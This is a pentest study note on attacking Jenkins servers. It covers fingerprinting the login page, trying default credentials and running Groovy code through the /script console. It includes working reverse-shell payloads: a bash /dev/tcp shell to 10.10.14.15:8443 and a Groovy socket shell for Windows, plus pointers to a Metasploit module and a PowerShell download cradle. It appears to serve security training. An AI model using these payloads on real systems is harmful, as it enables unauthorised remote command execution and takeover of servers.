Jenkins is an open-source automation server written in Java that helps developers build and test their software projects continuously. It is a server-based system that runs in servlet containers such as Tomcat. 
Over 86k companies used Jenkins such as facebook, Netflix and udemy.

## Discovery/Footprinting
![[Pasted image 20250924103103.png]]

The default installation typically uses Jenkins’ database to store credentials and does not allow users to register an account. We can fingerprint Jenkins quickly by the telltale login page. We can try default credentials.

## Attacking Jenkins
Once we have gained access to a Jenkins application, a quick way of achieving command execution on the underlying server is via the [Script](https://www.jenkins.io/doc/book/managing/script-console/) Console. The script console allows us to run arbitrary Groovy scripts within the Jenkins controller runtime. Jenkins is often installed in the context of the root or SYSTEM account.

The script console on endpoint `/script` allow the user to run grovy scripts. which are Obj oriented java compatible language similar to python and Ruby. Its source code compiled in java and can be run on any platform that have JRE.

```grovy
def cmd = 'id'
def sout = new StringBuffer(), serr = new StringBuffer()
def proc = cmd.execute()
proc.consumeProcessOutput(sout, serr)
proc.waitForOrKill(1000)
println sout
```

There are many ways to get reverse shell. We can use this script or [Metasploit](https://web.archive.org/web/20230326230234/https://www.rapid7.com/db/modules/exploit/multi/http/jenkins_script_console/) module.
```bash
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/10.10.14.15/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

After run this open the lisner.

Against a Windows host, we could attempt to add a user and connect to the host via RDP or WinRM or, to avoid making a change to the system, use a PowerShell download cradle with [Invoke-PowerShellTcp.ps1. ](https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1)
```groovy
def cmd = "cmd.exe /c dir".execute();
println("${cmd.text}");
```

we can also use this.
```groovy
String host="localhost";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

We can do some online research and lot of other vuln are present with POC code.













